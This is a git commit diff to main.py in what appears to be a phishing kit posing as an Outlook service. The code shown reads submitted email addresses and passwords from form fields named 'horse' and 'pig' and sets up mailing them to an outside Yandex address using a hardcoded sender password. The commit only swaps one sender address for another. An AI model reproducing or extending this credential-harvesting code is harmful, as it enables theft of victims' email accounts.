24e1ae8005e1d1f3da7fb1346b3b6c9b3db59099
archlve-outlook-service <motsjmirabel@gmail.com>
2026-07-11 04:31:22 -0400

    Update main.py

--- main.py
+++ main.py
@@ -217,7 +217,7 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'procurement@lexctrading.com'
+        sender_email = 'purchase@lexctrading.com'
         sender_emaill = 'adil'
         receiver_email = 'saintobitrans@yandex.ru'
         password = 'London@222$#'
